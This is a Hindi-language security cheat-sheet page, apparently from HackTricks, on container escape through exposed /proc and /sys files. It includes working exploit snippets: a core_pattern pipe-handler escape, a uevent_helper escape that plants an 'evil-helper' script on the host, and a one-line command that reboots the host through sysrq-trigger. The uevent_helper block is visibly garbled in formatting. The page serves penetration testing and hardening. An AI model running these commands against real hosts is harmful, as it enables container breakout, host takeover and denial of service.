# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

`/proc` और `/sys` का उचित namespace isolation के बिना खुलासा महत्वपूर्ण सुरक्षा जोखिमों को जन्म देता है, जिसमें हमले की सतह का विस्तार और जानकारी का खुलासा शामिल है। ये निर्देशिकाएँ संवेदनशील फ़ाइलें रखती हैं जो, यदि गलत तरीके से कॉन्फ़िगर की गईं या किसी अनधिकृत उपयोगकर्ता द्वारा एक्सेस की गईं, तो कंटेनर से भागने, होस्ट में संशोधन, या आगे के हमलों में मदद करने वाली जानकारी प्रदान कर सकती हैं। उदाहरण के लिए, `-v /proc:/host/proc` को गलत तरीके से माउंट करना AppArmor सुरक्षा को बायपास कर सकता है, जिससे `/host/proc` असुरक्षित रह जाता है।

**आप प्रत्येक संभावित vuln के बारे में और विवरण पा सकते हैं** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**।**

## procfs Vulnerabilities

### `/proc/sys`

यह निर्देशिका कर्नेल वेरिएबल्स को संशोधित करने की अनुमति देती है, आमतौर पर `sysctl(2)` के माध्यम से, और इसमें कई उपनिर्देशिकाएँ शामिल हैं:

#### **`/proc/sys/kernel/core_pattern`**

- [core(5)](https://man7.org/linux/man-pages/man5/core.5.html) में वर्णित।
- कोर-फ़ाइल निर्माण पर निष्पादित करने के लिए एक प्रोग्राम को परिभाषित करने की अनुमति देता है, जिसमें पहले 128 बाइट्स तर्क के रूप में होते हैं। यदि फ़ाइल एक पाइप `|` से शुरू होती है तो यह कोड निष्पादन की ओर ले जा सकता है।
- **परीक्षण और शोषण उदाहरण**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Set custom handler
sleep 5 && ./crash & # Trigger handler
```

#### **`/proc/sys/kernel/modprobe`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) में विस्तृत।
- कर्नेल मॉड्यूल लोडर का पथ रखता है, जिसे कर्नेल मॉड्यूल लोड करने के लिए बुलाया जाता है।
- **एक्सेस जांचने का उदाहरण**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Check access to modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) में संदर्भित।
- एक वैश्विक ध्वज जो नियंत्रित करता है कि क्या कर्नेल पैनिक करता है या OOM स्थिति होने पर OOM किलर को बुलाता है।

#### **`/proc/sys/fs`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) के अनुसार, फ़ाइल प्रणाली के बारे में विकल्प और जानकारी रखता है।
- लेखन पहुंच विभिन्न सेवा से वंचित हमलों को सक्षम कर सकती है।

#### **`/proc/sys/fs/binfmt_misc`**

- उनके जादुई संख्या के आधार पर गैर-देशी बाइनरी प्रारूपों के लिए व्याख्याकारों को पंजीकृत करने की अनुमति देता है।
- यदि `/proc/sys/fs/binfmt_misc/register` लिखा जा सकता है तो यह विशेषाधिकार वृद्धि या रूट शेल एक्सेस की ओर ले जा सकता है।
- प्रासंगिक शोषण और व्याख्या:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- गहन ट्यूटोरियल: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Others in `/proc`

#### **`/proc/config.gz`**

- यदि `CONFIG_IKCONFIG_PROC` सक्षम है तो कर्नेल कॉन्फ़िगरेशन प्रकट कर सकता है।
- चल रहे कर्नेल में कमजोरियों की पहचान करने के लिए हमलावरों के लिए उपयोगी।

#### **`/proc/sysrq-trigger`**

- Sysrq कमांड को बुलाने की अनुमति देता है, संभावित रूप से तत्काल सिस्टम रिबूट या अन्य महत्वपूर्ण क्रियाएँ कर सकता है।
- **होस्ट को रिबूट करने का उदाहरण**:

```bash
echo b > /proc/sysrq-trigger # Reboots the host
```

#### **`/proc/kmsg`**

- कर्नेल रिंग बफर संदेशों को उजागर करता है।
- कर्नेल शोषण, पते के रिसाव में मदद कर सकता है, और संवेदनशील सिस्टम जानकारी प्रदान कर सकता है।

#### **`/proc/kallsyms`**

- कर्नेल द्वारा निर्यातित प्रतीकों और उनके पते की सूची बनाता है।
- कर्नेल शोषण विकास के लिए आवश्यक, विशेष रूप से KASLR को पार करने के लिए।
- पता जानकारी `kptr_restrict` को `1` या `2` पर सेट करने के साथ प्रतिबंधित है।
- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) में विवरण।

#### **`/proc/[pid]/mem`**

- कर्नेल मेमोरी डिवाइस `/dev/mem` के साथ इंटरफेस करता है।
- ऐतिहासिक रूप से विशेषाधिकार वृद्धि हमलों के प्रति संवेदनशील।
- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) पर अधिक।

#### **`/proc/kcore`**

- सिस्टम की भौतिक मेमोरी को ELF कोर प्रारूप में दर्शाता है।
- पढ़ने से होस्ट सिस्टम और अन्य कंटेनरों की मेमोरी सामग्री लीक हो सकती है।
- बड़ी फ़ाइल का आकार पढ़ने की समस्याओं या सॉफ़्टवेयर क्रैश का कारण बन सकता है।
- [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/) में विस्तृत उपयोग।

#### **`/proc/kmem`**

- कर्नेल वर्चुअल मेमोरी का प्रतिनिधित्व करने के लिए `/dev/kmem` के लिए वैकल्पिक इंटरफेस।
- पढ़ने और लिखने की अनुमति देता है, इसलिए कर्नेल मेमोरी का प्रत्यक्ष संशोधन।

#### **`/proc/mem`**

- भौतिक मेमोरी का प्रतिनिधित्व करने के लिए `/dev/mem` के लिए वैकल्पिक इंटरफेस।
- पढ़ने और लिखने की अनुमति देता है, सभी मेमोरी का संशोधन वर्चुअल से भौतिक पते को हल करने की आवश्यकता है।

#### **`/proc/sched_debug`**

- प्रक्रिया शेड्यूलिंग जानकारी लौटाता है, PID namespace सुरक्षा को बायपास करता है।
- प्रक्रिया नाम, आईडी और cgroup पहचानकर्ताओं को उजागर करता है।

#### **`/proc/[pid]/mountinfo`**

- प्रक्रिया के माउंट namespace में माउंट बिंदुओं के बारे में जानकारी प्रदान करता है।
- कंटेनर `rootfs` या छवि के स्थान को उजागर करता है।

### `/sys` Vulnerabilities

#### **`/sys/kernel/uevent_helper`**

- कर्नेल डिवाइस `uevents` को संभालने के लिए उपयोग किया जाता है।
- `/sys/kernel/uevent_helper` में लिखने से `uevent` ट्रिगर होने पर मनमाने स्क्रिप्ट को निष्पादित किया जा सकता है।
- **शोषण का उदाहरण**: %%%bash

#### एक पेलोड बनाता है

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### कंटेनर के लिए OverlayFS माउंट से होस्ट पथ खोजता है

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### दुर्भावनापूर्ण सहायक के लिए uevent_helper सेट करता है

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### एक uevent को ट्रिगर करता है

echo change > /sys/class/mem/null/uevent

#### आउटपुट पढ़ता है

cat /output %%%

#### **`/sys/class/thermal`**

- तापमान सेटिंग्स को नियंत्रित करता है, संभावित रूप से DoS हमलों या भौतिक क्षति का कारण बनता है।

#### **`/sys/kernel/vmcoreinfo`**

- कर्नेल पते लीक करता है, संभावित रूप से KASLR को खतरे में डालता है।

#### **`/sys/kernel/security`**

- `securityfs` इंटरफेस को रखता है, जो AppArmor जैसे Linux सुरक्षा मॉड्यूल की कॉन्फ़िगरेशन की अनुमति देता है।
- पहुंच एक कंटेनर को अपने MAC सिस्टम को निष्क्रिय करने में सक्षम कर सकती है।

#### **`/sys/firmware/efi/vars` और `/sys/firmware/efi/efivars`**

- NVRAM में EFI वेरिएबल्स के साथ इंटरैक्ट करने के लिए इंटरफेस को उजागर करता है।
- गलत कॉन्फ़िगरेशन या शोषण से लैपटॉप या अनबूटेबल होस्ट मशीनें बर्बाद हो सकती हैं।

#### **`/sys/kernel/debug`**

- `debugfs` कर्नेल के लिए "कोई नियम नहीं" डिबगिंग इंटरफेस प्रदान करता है।
- इसकी अनियंत्रित प्रकृति के कारण सुरक्षा मुद्दों का इतिहास है।

### References

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
